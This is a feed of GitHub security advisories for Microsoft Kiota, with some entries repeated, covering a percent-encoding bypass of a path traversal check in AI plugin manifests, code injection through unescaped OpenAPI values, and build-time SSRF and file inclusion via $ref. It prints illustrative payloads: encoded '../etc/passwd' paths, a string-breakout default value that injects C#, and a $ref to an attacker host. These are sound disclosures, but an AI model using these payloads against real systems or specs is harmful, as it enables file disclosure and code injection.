<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/nuget.rss</id>
    <title>Security Advisory for .NET packages hosted at the NuGet Gallery</title>
    <updated>2026-08-26T10:22:49.013Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anuget"/>
    <subtitle>Security Advisory for .NET packages hosted at the NuGet Gallery on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Path traversal in generated plugin manifest static_template.file reference (percent-encoding bypass)]]></title>
        <id>https://github.com/advisories/GHSA-p5rm-jg5c-8c77</id>
        <link href="https://github.com/advisories/GHSA-p5rm-jg5c-8c77"/>
        <updated>2026-08-17T15:11:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Kiota generates AI plugin manifests from an OpenAPI description. When the description contains an <code>x-ai-capabilities</code> response semantics <code>static_template</code> (or the adaptive-card extension <code>x-ai-adaptive-card</code>), the <code>file</code> reference is written into the generated manifest's <code>response_semantics.static_template.file</code> and is later resolved by the AI host <strong>relative to the plugin package</strong>.</p>
<p>An attacker who controls or tampers with the OpenAPI description consumed by Kiota can supply a <code>file</code> reference that resolves <strong>outside</strong> the manifest package (e.g. <code>../../../../etc/passwd</code>, an absolute path, or a <code>file://</code> / <code>http(s)://</code> URI). When the generated manifest is deployed and consumed by an AI host, this can lead to inclusion or disclosure of files outside the intended package boundary (CWE-22 Path Traversal, CWE-829 Inclusion of Functionality from an Untrusted Control Sphere).</p>
<p>A mitigation shipped in v1.32.5 (<code>ExtensionResponseSemanticsStaticTemplate.IsSafeFileReference</code>) rejected literal traversal, rooted paths, drive-qualified paths, and absolute URIs. However, that check inspected the <strong>raw</strong> reference string, so <strong>percent-encoded</strong> payloads bypassed every check and were still emitted verbatim. Examples that were incorrectly accepted as safe:</p>
<table>
<thead>
<tr>
<th>Input</th>
<th>Decodes to</th>
</tr>
</thead>
<tbody><tr>
<td><code>%2e%2e/card.json</code></td>
<td><code>../card.json</code></td>
</tr>
<tr>
<td><code>..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></td>
<td><code>../../../../../../etc/passwd</code></td>
</tr>
<tr>
<td><code>file%3A%2F%2F%2Fetc%2Fpasswd</code></td>
<td><code>file:///etc/passwd</code></td>
</tr>
<tr>
<td><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></td>
<td><code>../../../etc/passwd</code></td>
</tr>
</tbody></table>
<p>Multi-level (double) encoding such as <code>%252e%252e%252fcard.json</code> was also affected. A follow-up review found additional residual bypasses of the same validator: an embedded NUL byte (<code>%00</code>) that truncated the path and defeated the parent-directory segment check, encoding nested deeper than the decode budget (which failed open), and Unicode full-width homoglyphs (e.g. <code>%EF%BC%8E%EF%BC%8E</code> → <code>．．</code>).</p>
<h3 id="patches">Patches</h3>
<ul>
<li>The percent-encoding bypass is fixed by decoding the reference (bounded multi-pass) before validation: <a href="https://github.com/microsoft/kiota/pull/7910">https://github.com/microsoft/kiota/pull/7910</a></li>
<li>Residual bypasses (NUL / control characters, decode-budget fail-open, Unicode homoglyphs) are fixed by failing closed on residual encoding, rejecting control characters, and NFKC-folding before validation: <a href="https://github.com/microsoft/kiota/pull/7913">https://github.com/microsoft/kiota/pull/7913</a> (tracking issue <a href="https://github.com/microsoft/kiota/issues/7912">https://github.com/microsoft/kiota/issues/7912</a>)</li>
</ul>
<p>Users should upgrade to the first released <code>Microsoft.OpenApi.Kiota</code> version that includes these fixes (the release following 1.33.0).</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Only generate clients/plugins from trusted OpenAPI descriptions.</li>
<li>Review generated plugin manifests before deployment and reject any <code>response_semantics.static_template.file</code> value that is not a simple relative path within the <code>adaptiveCards/</code> package folder (no <code>..</code>, no rooted/absolute paths, no URIs, no percent-encoded separators).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</li>
<li>CWE-829: Inclusion of Functionality from an Untrusted Control Sphere</li>
<li>Affected code: <code>src/Kiota.Builder/OpenApiExtensions/OpenApiAiCapabilitiesExtension.cs</code> (<code>IsSafeFileReference</code>) and enforcement in <code>src/Kiota.Builder/Plugins/PluginsGenerationService.cs</code>.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-p5rm-jg5c-8c77">https://github.com/microsoft/kiota/security/advisories/GHSA-p5rm-jg5c-8c77</a></li>
<li><a href="https://github.com/microsoft/kiota/issues/7912">https://github.com/microsoft/kiota/issues/7912</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7910">https://github.com/microsoft/kiota/pull/7910</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7913">https://github.com/microsoft/kiota/pull/7913</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/430008e9d700b3fe80f206c672415cfbd8e830e7">https://github.com/microsoft/kiota/commit/430008e9d700b3fe80f206c672415cfbd8e830e7</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/de3d18d9fe31ced4ac749728d3a2f94811f59268">https://github.com/microsoft/kiota/commit/de3d18d9fe31ced4ac749728d3a2f94811f59268</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.34.0">https://github.com/microsoft/kiota/releases/tag/v1.34.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p5rm-jg5c-8c77">https://github.com/advisories/GHSA-p5rm-jg5c-8c77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5rm-jg5c-8c77</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:14:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Path traversal in generated plugin manifest static_template.file reference (percent-encoding bypass)]]></title>
        <id>https://github.com/advisories/GHSA-p5rm-jg5c-8c77</id>
        <link href="https://github.com/advisories/GHSA-p5rm-jg5c-8c77"/>
        <updated>2026-08-17T15:11:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Kiota generates AI plugin manifests from an OpenAPI description. When the description contains an <code>x-ai-capabilities</code> response semantics <code>static_template</code> (or the adaptive-card extension <code>x-ai-adaptive-card</code>), the <code>file</code> reference is written into the generated manifest's <code>response_semantics.static_template.file</code> and is later resolved by the AI host <strong>relative to the plugin package</strong>.</p>
<p>An attacker who controls or tampers with the OpenAPI description consumed by Kiota can supply a <code>file</code> reference that resolves <strong>outside</strong> the manifest package (e.g. <code>../../../../etc/passwd</code>, an absolute path, or a <code>file://</code> / <code>http(s)://</code> URI). When the generated manifest is deployed and consumed by an AI host, this can lead to inclusion or disclosure of files outside the intended package boundary (CWE-22 Path Traversal, CWE-829 Inclusion of Functionality from an Untrusted Control Sphere).</p>
<p>A mitigation shipped in v1.32.5 (<code>ExtensionResponseSemanticsStaticTemplate.IsSafeFileReference</code>) rejected literal traversal, rooted paths, drive-qualified paths, and absolute URIs. However, that check inspected the <strong>raw</strong> reference string, so <strong>percent-encoded</strong> payloads bypassed every check and were still emitted verbatim. Examples that were incorrectly accepted as safe:</p>
<table>
<thead>
<tr>
<th>Input</th>
<th>Decodes to</th>
</tr>
</thead>
<tbody><tr>
<td><code>%2e%2e/card.json</code></td>
<td><code>../card.json</code></td>
</tr>
<tr>
<td><code>..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></td>
<td><code>../../../../../../etc/passwd</code></td>
</tr>
<tr>
<td><code>file%3A%2F%2F%2Fetc%2Fpasswd</code></td>
<td><code>file:///etc/passwd</code></td>
</tr>
<tr>
<td><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></td>
<td><code>../../../etc/passwd</code></td>
</tr>
</tbody></table>
<p>Multi-level (double) encoding such as <code>%252e%252e%252fcard.json</code> was also affected. A follow-up review found additional residual bypasses of the same validator: an embedded NUL byte (<code>%00</code>) that truncated the path and defeated the parent-directory segment check, encoding nested deeper than the decode budget (which failed open), and Unicode full-width homoglyphs (e.g. <code>%EF%BC%8E%EF%BC%8E</code> → <code>．．</code>).</p>
<h3 id="patches">Patches</h3>
<ul>
<li>The percent-encoding bypass is fixed by decoding the reference (bounded multi-pass) before validation: <a href="https://github.com/microsoft/kiota/pull/7910">https://github.com/microsoft/kiota/pull/7910</a></li>
<li>Residual bypasses (NUL / control characters, decode-budget fail-open, Unicode homoglyphs) are fixed by failing closed on residual encoding, rejecting control characters, and NFKC-folding before validation: <a href="https://github.com/microsoft/kiota/pull/7913">https://github.com/microsoft/kiota/pull/7913</a> (tracking issue <a href="https://github.com/microsoft/kiota/issues/7912">https://github.com/microsoft/kiota/issues/7912</a>)</li>
</ul>
<p>Users should upgrade to the first released <code>Microsoft.OpenApi.Kiota</code> version that includes these fixes (the release following 1.33.0).</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Only generate clients/plugins from trusted OpenAPI descriptions.</li>
<li>Review generated plugin manifests before deployment and reject any <code>response_semantics.static_template.file</code> value that is not a simple relative path within the <code>adaptiveCards/</code> package folder (no <code>..</code>, no rooted/absolute paths, no URIs, no percent-encoded separators).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</li>
<li>CWE-829: Inclusion of Functionality from an Untrusted Control Sphere</li>
<li>Affected code: <code>src/Kiota.Builder/OpenApiExtensions/OpenApiAiCapabilitiesExtension.cs</code> (<code>IsSafeFileReference</code>) and enforcement in <code>src/Kiota.Builder/Plugins/PluginsGenerationService.cs</code>.</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-p5rm-jg5c-8c77">https://github.com/microsoft/kiota/security/advisories/GHSA-p5rm-jg5c-8c77</a></li>
<li><a href="https://github.com/microsoft/kiota/issues/7912">https://github.com/microsoft/kiota/issues/7912</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7910">https://github.com/microsoft/kiota/pull/7910</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7913">https://github.com/microsoft/kiota/pull/7913</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/430008e9d700b3fe80f206c672415cfbd8e830e7">https://github.com/microsoft/kiota/commit/430008e9d700b3fe80f206c672415cfbd8e830e7</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/de3d18d9fe31ced4ac749728d3a2f94811f59268">https://github.com/microsoft/kiota/commit/de3d18d9fe31ced4ac749728d3a2f94811f59268</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.34.0">https://github.com/microsoft/kiota/releases/tag/v1.34.0</a></li>
<li><a href="https://github.com/advisories/GHSA-p5rm-jg5c-8c77">https://github.com/advisories/GHSA-p5rm-jg5c-8c77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p5rm-jg5c-8c77</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:14:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Kiota: Code Generation Literal Injection]]></title>
        <id>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</id>
        <link href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f"/>
        <updated>2026-08-17T14:58:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-advisory-cve-2026-41134-code-generation-literal-injection-in-kiota">CVE Advisory (CVE-2026-41134): Code Generation Literal Injection in Kiota</h1>
<h2 id="summary">Summary</h2>
<p>Kiota versions <strong>prior to 1.29.1 and 1.31.1</strong> are affected by a code-generation literal injection vulnerability in multiple writer sinks (for example: serialization/deserialization keys, path/query parameter mappings, URL template metadata, enum/property metadata, and default value emission).</p>
<p>When malicious values from an OpenAPI description are emitted into generated source without context-appropriate escaping, an attacker can break out of string literals and inject additional code into generated clients.</p>
<h2 id="impact-and-preconditions">Impact and Preconditions</h2>
<p>This issue is only practically exploitable when:</p>
<ol>
<li>the OpenAPI description used for generation is from an <strong>untrusted source</strong>, or</li>
<li>a normally trusted OpenAPI description has been <strong>compromised/tampered with</strong>.</li>
</ol>
<p>If you only generate from trusted, integrity-protected API descriptions, risk is significantly reduced.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li><strong>Affected:</strong> all versions <strong>&lt; 1.29.1** and **&gt;= 1.30.0, &lt; 1.31.1</strong></li>
<li><strong>Fixed:</strong> <strong>1.29.1, 1.31.1,</strong> and later</li>
</ul>
<h2 id="illustrative-exploit-example">Illustrative Exploit Example</h2>
<h3 id="example-openapi-fragment-malicious-default-value">Example OpenAPI fragment (malicious default value)</h3>
<pre><code class="language-yaml">openapi: 3.0.1
info:
  title: Exploit Demo
  version: 1.0.0
components:
  schemas:
    User:
      type: object
      properties:
        displayName:
          type: string
          default: "\"; throw new System.Exception(\"injected\"); //"
</code></pre>
<h3 id="example-generated-c-snippet-before-fix-illustrative">Example generated C# snippet before fix (illustrative)</h3>
<pre><code class="language-csharp">public User() {
    DisplayName = ""; throw new System.Exception("injected"); //";
}
</code></pre>
<p>The injected payload escapes the intended string context and introduces attacker-controlled statements in generated code.</p>
<blockquote>
<p>Note: this exploit is not limited to default values, but may also impact properties names (serialization), path or query parameters, enum representations and other locations.</p>
</blockquote>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Upgrade Kiota to <strong>1.31.1 or later</strong>.</li>
<li>Regenerate/refresh existing generated clients as a precaution:</li>
</ol>
<pre><code class="language-bash">kiota update
</code></pre>
<p>Refreshing generated clients ensures previously generated vulnerable code is replaced with hardened output.</p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>We would like to thank the researcher Thanatos Tian（Polyu) for finding this issue and for his contribution to this open source project.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41134">https://nvd.nist.gov/vuln/detail/CVE-2026-41134</a></li>
<li><a href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T23:39:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Kiota: Code Generation Literal Injection]]></title>
        <id>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</id>
        <link href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f"/>
        <updated>2026-08-17T14:58:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-advisory-cve-2026-41134-code-generation-literal-injection-in-kiota">CVE Advisory (CVE-2026-41134): Code Generation Literal Injection in Kiota</h1>
<h2 id="summary">Summary</h2>
<p>Kiota versions <strong>prior to 1.29.1 and 1.31.1</strong> are affected by a code-generation literal injection vulnerability in multiple writer sinks (for example: serialization/deserialization keys, path/query parameter mappings, URL template metadata, enum/property metadata, and default value emission).</p>
<p>When malicious values from an OpenAPI description are emitted into generated source without context-appropriate escaping, an attacker can break out of string literals and inject additional code into generated clients.</p>
<h2 id="impact-and-preconditions">Impact and Preconditions</h2>
<p>This issue is only practically exploitable when:</p>
<ol>
<li>the OpenAPI description used for generation is from an <strong>untrusted source</strong>, or</li>
<li>a normally trusted OpenAPI description has been <strong>compromised/tampered with</strong>.</li>
</ol>
<p>If you only generate from trusted, integrity-protected API descriptions, risk is significantly reduced.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li><strong>Affected:</strong> all versions <strong>&lt; 1.29.1** and **&gt;= 1.30.0, &lt; 1.31.1</strong></li>
<li><strong>Fixed:</strong> <strong>1.29.1, 1.31.1,</strong> and later</li>
</ul>
<h2 id="illustrative-exploit-example">Illustrative Exploit Example</h2>
<h3 id="example-openapi-fragment-malicious-default-value">Example OpenAPI fragment (malicious default value)</h3>
<pre><code class="language-yaml">openapi: 3.0.1
info:
  title: Exploit Demo
  version: 1.0.0
components:
  schemas:
    User:
      type: object
      properties:
        displayName:
          type: string
          default: "\"; throw new System.Exception(\"injected\"); //"
</code></pre>
<h3 id="example-generated-c-snippet-before-fix-illustrative">Example generated C# snippet before fix (illustrative)</h3>
<pre><code class="language-csharp">public User() {
    DisplayName = ""; throw new System.Exception("injected"); //";
}
</code></pre>
<p>The injected payload escapes the intended string context and introduces attacker-controlled statements in generated code.</p>
<blockquote>
<p>Note: this exploit is not limited to default values, but may also impact properties names (serialization), path or query parameters, enum representations and other locations.</p>
</blockquote>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Upgrade Kiota to <strong>1.31.1 or later</strong>.</li>
<li>Regenerate/refresh existing generated clients as a precaution:</li>
</ol>
<pre><code class="language-bash">kiota update
</code></pre>
<p>Refreshing generated clients ensures previously generated vulnerable code is replaced with hardened output.</p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>We would like to thank the researcher Thanatos Tian（Polyu) for finding this issue and for his contribution to this open source project.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41134">https://nvd.nist.gov/vuln/detail/CVE-2026-41134</a></li>
<li><a href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T23:39:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Kiota: Code Generation Literal Injection]]></title>
        <id>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</id>
        <link href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f"/>
        <updated>2026-08-17T14:58:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-advisory-cve-2026-41134-code-generation-literal-injection-in-kiota">CVE Advisory (CVE-2026-41134): Code Generation Literal Injection in Kiota</h1>
<h2 id="summary">Summary</h2>
<p>Kiota versions <strong>prior to 1.29.1 and 1.31.1</strong> are affected by a code-generation literal injection vulnerability in multiple writer sinks (for example: serialization/deserialization keys, path/query parameter mappings, URL template metadata, enum/property metadata, and default value emission).</p>
<p>When malicious values from an OpenAPI description are emitted into generated source without context-appropriate escaping, an attacker can break out of string literals and inject additional code into generated clients.</p>
<h2 id="impact-and-preconditions">Impact and Preconditions</h2>
<p>This issue is only practically exploitable when:</p>
<ol>
<li>the OpenAPI description used for generation is from an <strong>untrusted source</strong>, or</li>
<li>a normally trusted OpenAPI description has been <strong>compromised/tampered with</strong>.</li>
</ol>
<p>If you only generate from trusted, integrity-protected API descriptions, risk is significantly reduced.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li><strong>Affected:</strong> all versions <strong>&lt; 1.29.1** and **&gt;= 1.30.0, &lt; 1.31.1</strong></li>
<li><strong>Fixed:</strong> <strong>1.29.1, 1.31.1,</strong> and later</li>
</ul>
<h2 id="illustrative-exploit-example">Illustrative Exploit Example</h2>
<h3 id="example-openapi-fragment-malicious-default-value">Example OpenAPI fragment (malicious default value)</h3>
<pre><code class="language-yaml">openapi: 3.0.1
info:
  title: Exploit Demo
  version: 1.0.0
components:
  schemas:
    User:
      type: object
      properties:
        displayName:
          type: string
          default: "\"; throw new System.Exception(\"injected\"); //"
</code></pre>
<h3 id="example-generated-c-snippet-before-fix-illustrative">Example generated C# snippet before fix (illustrative)</h3>
<pre><code class="language-csharp">public User() {
    DisplayName = ""; throw new System.Exception("injected"); //";
}
</code></pre>
<p>The injected payload escapes the intended string context and introduces attacker-controlled statements in generated code.</p>
<blockquote>
<p>Note: this exploit is not limited to default values, but may also impact properties names (serialization), path or query parameters, enum representations and other locations.</p>
</blockquote>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Upgrade Kiota to <strong>1.31.1 or later</strong>.</li>
<li>Regenerate/refresh existing generated clients as a precaution:</li>
</ol>
<pre><code class="language-bash">kiota update
</code></pre>
<p>Refreshing generated clients ensures previously generated vulnerable code is replaced with hardened output.</p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>We would like to thank the researcher Thanatos Tian（Polyu) for finding this issue and for his contribution to this open source project.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41134">https://nvd.nist.gov/vuln/detail/CVE-2026-41134</a></li>
<li><a href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T23:39:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Kiota: Code Generation Literal Injection]]></title>
        <id>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</id>
        <link href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f"/>
        <updated>2026-08-17T14:58:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-advisory-cve-2026-41134-code-generation-literal-injection-in-kiota">CVE Advisory (CVE-2026-41134): Code Generation Literal Injection in Kiota</h1>
<h2 id="summary">Summary</h2>
<p>Kiota versions <strong>prior to 1.29.1 and 1.31.1</strong> are affected by a code-generation literal injection vulnerability in multiple writer sinks (for example: serialization/deserialization keys, path/query parameter mappings, URL template metadata, enum/property metadata, and default value emission).</p>
<p>When malicious values from an OpenAPI description are emitted into generated source without context-appropriate escaping, an attacker can break out of string literals and inject additional code into generated clients.</p>
<h2 id="impact-and-preconditions">Impact and Preconditions</h2>
<p>This issue is only practically exploitable when:</p>
<ol>
<li>the OpenAPI description used for generation is from an <strong>untrusted source</strong>, or</li>
<li>a normally trusted OpenAPI description has been <strong>compromised/tampered with</strong>.</li>
</ol>
<p>If you only generate from trusted, integrity-protected API descriptions, risk is significantly reduced.</p>
<h2 id="affected-versions">Affected Versions</h2>
<ul>
<li><strong>Affected:</strong> all versions <strong>&lt; 1.29.1** and **&gt;= 1.30.0, &lt; 1.31.1</strong></li>
<li><strong>Fixed:</strong> <strong>1.29.1, 1.31.1,</strong> and later</li>
</ul>
<h2 id="illustrative-exploit-example">Illustrative Exploit Example</h2>
<h3 id="example-openapi-fragment-malicious-default-value">Example OpenAPI fragment (malicious default value)</h3>
<pre><code class="language-yaml">openapi: 3.0.1
info:
  title: Exploit Demo
  version: 1.0.0
components:
  schemas:
    User:
      type: object
      properties:
        displayName:
          type: string
          default: "\"; throw new System.Exception(\"injected\"); //"
</code></pre>
<h3 id="example-generated-c-snippet-before-fix-illustrative">Example generated C# snippet before fix (illustrative)</h3>
<pre><code class="language-csharp">public User() {
    DisplayName = ""; throw new System.Exception("injected"); //";
}
</code></pre>
<p>The injected payload escapes the intended string context and introduces attacker-controlled statements in generated code.</p>
<blockquote>
<p>Note: this exploit is not limited to default values, but may also impact properties names (serialization), path or query parameters, enum representations and other locations.</p>
</blockquote>
<h2 id="remediation">Remediation</h2>
<ol>
<li>Upgrade Kiota to <strong>1.31.1 or later</strong>.</li>
<li>Regenerate/refresh existing generated clients as a precaution:</li>
</ol>
<pre><code class="language-bash">kiota update
</code></pre>
<p>Refreshing generated clients ensures previously generated vulnerable code is replaced with hardened output.</p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>We would like to thank the researcher Thanatos Tian（Polyu) for finding this issue and for his contribution to this open source project.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/microsoft/kiota/security/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41134">https://nvd.nist.gov/vuln/detail/CVE-2026-41134</a></li>
<li><a href="https://github.com/advisories/GHSA-2hx3-vp6r-mg3f">https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2hx3-vp6r-mg3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T23:39:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Generation-time SSRF + remote/local file inclusion via unrestricted $ref]]></title>
        <id>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</id>
        <link href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8"/>
        <updated>2026-08-17T14:56:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Microsoft Kiota resolved OpenAPI <code>$ref</code>s by fetching remote <code>http(s)</code> URLs and reading local files
(including absolute / out-of-tree paths), inlining the referenced schema into the generated client.
Running <code>kiota generate</code> on a spec whose <code>$ref</code> pointed at an attacker/internal URL or an arbitrary
local file yielded SSRF, remote file inclusion, and local file inclusion. Verified on <strong>1.32.3 / 1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<ul>
<li><code>$ref: http://attacker/internal-evil.json#/...</code> → build host fetches the URL (SSRF) and inlines the
remote schema (RFI); confirmed property <code>REMOTE_KIOTA_PROP</code> in the generated client.</li>
<li><code>$ref: /abs/path.json#/...</code> or <code>../../secret.json#/...</code> → Kiota reads the out-of-tree local file and
inlines its schema (LFI); confirmed <code>Leaked</code> schema in the generated client. Resolution is transitive
across nesting levels.</li>
</ul>
<p>Kiota <strong>escapes</strong> its output sinks (comments/strings/identifiers), so attacker-controlled remote/local
content cannot break out into code — no RCE. The chain stops at SSRF + RFI + LFI.</p>
<h3 id="impact">Impact</h3>
<p>Build-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files (CWE-22), and
inclusion of untrusted remote content (CWE-829), from running the generator on an attacker-controlled or
attacker-influenced OpenAPI description. No code execution. Notable because Kiota is otherwise the hardened
generator (it resists the code-injection class).</p>
<p>The relevant threat is not "change the generated output" (an attacker who fully controls the description can
already do that) but the <strong>side effects on the build host</strong>: outbound requests from inside the CI network
(cloud metadata, internal-only services) and reads of local files the attacker never possessed, whose contents
are then inlined into the generated — and typically committed/published — client. It also bypasses controls
that review the description document but not externally-referenced content.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a>). External reference resolution is now
<strong>default-deny</strong>: a new <code>AllowedExternalOriginsStreamLoader</code> refuses to load any external <code>$ref</code> — remote
<code>http(s)</code> URLs and local file paths alike — unless its origin/path is explicitly allow-listed. A new
<code>--allowed-external-origins</code> parameter (added to the commands that load OpenAPI descriptions) opts specific
origins back in, accepting <code>*</code>, full URIs, URI patterns, full paths, relative paths, or path patterns
(wildcards supported). With no allow-list entries, external references are not loaded at all.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. External references now require explicit opt-in via
<code>--allowed-external-origins</code>; add only trusted origins/paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59867">https://nvd.nist.gov/vuln/detail/CVE-2026-59867</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1">https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:10:17.000Z</published>
    </entry>
